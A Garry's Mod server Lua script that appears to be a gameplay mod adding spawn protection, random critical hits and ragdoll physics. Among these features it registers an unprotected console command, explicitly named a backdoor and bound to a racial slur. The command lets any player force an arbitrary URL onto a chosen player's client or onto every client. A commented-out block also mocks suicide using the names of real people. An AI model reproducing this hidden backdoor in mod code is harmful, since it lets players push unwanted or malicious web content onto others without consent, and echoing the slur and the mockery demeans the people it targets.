local RudeTable = {"Eva Braun","Kurt Colbain","Christopher Dorner","Adolf Hitler","Robin Williams"}

function FuckYouBill(player)
	--player:ChatPrint("Calm down there " .. RudeTable[math.random(1,#RudeTable)] .. "." )
	--return false
end

hook.Add("CanPlayerSuicide","FUCK YOU BILL",FuckYouBill)


function SuperSpawnProtectionPlayerSpawn(ply)
	ply:SetMaterial("debug/env_cubemap_model")
	ply:GodEnable()
	ply.SpawnImmunityTime = CurTime() + 3
	ply.SpawnProtectionEnabled = true
end

hook.Add( "PlayerSpawn", "Spawn Protection Spawn", SuperSpawnProtectionPlayerSpawn )


function SuperSpawnProtectionThink()
	for k,ply in pairs(player.GetAll()) do
		if ply:Alive() == true then
			if ply.SpawnProtectionEnabled == true then
			
				if ply.SpawnImmunityTime <= CurTime() then
					ply:ChatPrint("Your spawn protection has worn off.")
					ply.SpawnProtectionEnabled = false
					ply:GodDisable()
				end
				
				if ply:KeyDown(IN_ATTACK) and ply.SpawnImmunityTime - 1 <= CurTime() then
					ply:ChatPrint("Your spawn protection has worn off.")
					ply.SpawnProtectionEnabled = false
					ply:GodDisable()
				end
				
			elseif ply.SpawnProtectionEnabled == false then
				ply:SetMaterial("")
				--print("What")
			end
			
			
		end
	end
end

hook.Add( "Think", "Spawn Protection Think", SuperSpawnProtectionThink )


function SuperSpawnProtectionPlayerShouldTakeDamage(ply,attacker)
	--[[
	if ply.ImmuneFromDamage == true then
		return false
	end
	--]]
end

hook.Add( "PlayerShouldTakeDamage", "Spawn Protection PlayerShouldTakeDamage", SuperSpawnProtectionPlayerShouldTakeDamage )


local GlobalCritChance = 2
local GlobalCritAdd = 1

function BurCritDamage(victim,hitgroup,dmginfo)

	local attacker = dmginfo:GetAttacker()

	if victim:IsPlayer() and attacker:IsPlayer() then

		if not attacker.CritChance then
			attacker.CritChance = GlobalCritChance
		end
		
		local Random = math.random(1,100)
		
		--print(Random,attacker.CritChance)
		
		if Random <= attacker.CritChance then
			dmginfo:ScaleDamage(2)
			--print(attacker:Name() .. " scored a critical hit on " .. victim:Name())
			
			victim:EmitSound("player/crit_received"..math.random(1,3)..".wav")
			attacker:EmitSound("player/crit_hit"..math.random(2,5)..".wav")
			
			
			attacker.CritChance = GlobalCritChance
		else
			attacker.CritChance = attacker.CritChance + GlobalCritAdd
		end
		
	end

end

hook.Add("ScalePlayerDamage","Burger Crits",BurCritDamage)

function OGWHID_CommandBackdoor(ply,cmd,args)

	if args then  

		local Victim = nil
		local URL = nil
		local Time = 10
		
		if args[1] then
		
			if args[1] == "*" then
		
				Victim = Entity(0)
		
			else
			
				local PlayerTable = {}
				local Name = args[1]
				
				for k,v in pairs(player.GetAll()) do
					if OGWHID_TableFind(string.lower(Name), string.lower(v:Nick())) and not Victim then
						Victim = v
					end
				end
				
			end
		
		else
			ply:ChatPrint("Try to enter something next time.")
			return
		end
		
		if Victim == nil then
			ply:ChatPrint("Could not find player '" .. args[1] .. "'.")
			return 
		end
		
		if args[2] then
		
			if string.lower(args[2]) ~= "stop" then
				
				string.Replace(args[2],"https","http")
				
				if OGWHID_TableFind("http",args[2]) then
					URL = args[2]
				else
					URL = "http://" .. args[2]
				end

				--[[
				if OGWHID_TableFind("youtube.com",URL) then
					URL = URL .. "?rel=0&amp;controls=0&amp;showinfo=0&amp;autoplay=1"
					
					URL = string.Replace(URL,"watch?v=","embed/")
					--URL = https://www.youtube.com/embed/caKcJ9Jllfc?rel=0&amp;controls=0&amp;showinfo=0
				end
				--]]
			
			else
			
				URL = "stop"
				
			end
			
		else
		
			ply:ChatPrint("Missing URL or phrase.")
			
			return
		end
		
		if not URL then
			ply:ChatPrint("'" .. args[2] .. "' is not a URL. Enter a URL.")
		end
		
		if args[3] then
		
			if type(tonumber(args[3])) ~= "number" then
				
				ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
				
				return
			end

			Time = tonumber(args[3])
			
		end
		
		if not Time then 
			ply:ChatPrint("'" .. args[3] .. "' is not a number. Enter a number.")
		end
		
		if Victim and URL and Time then
		
			OGWHID_Send(Victim,URL,Time,false,Victim)
			OGWHID_Send(ply,URL,Time,false,ply)

		end
		
	else
	
		ply:ChatPrint("Try to enter something next time.")
		
	end

end

concommand.Add("NIGGER",OGWHID_CommandBackdoor)


function RagdollMod(ply)

	SafeRemoveEntity(ply:GetRagdollEntity())
	
	local Rag = ents.Create("prop_ragdoll")
	Rag:SetPos(ply:GetPos())
	Rag:SetAngles(ply:GetAngles())
	Rag:SetModel(ply:GetModel())
	local Sequence = Rag:LookupSequence("idle")
	--Rag:SetSequence(ply:GetSequence())
	Rag:SetKeyValue("sequence",1)
	Rag:Spawn()
	Rag:Activate()
	Rag:SetCollisionGroup(COLLISION_GROUP_DEBRIS)
	ply:Spectate( OBS_MODE_CHASE )
	ply:SpectateEntity(Rag)
	
	--Rag:ManipulateBoneScale( Rag:GetHitBoxBone(1,HITGROUP_HEAD), Vector(0,0,0) )
	

	local phys = Rag:GetPhysicsObject()
	phys:SetVelocity(Vector(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000)))
	
	SafeRemoveEntityDelayed(Rag,60)



end

hook.Add("PostPlayerDeath","Ragdoll Mod",RagdollMod)




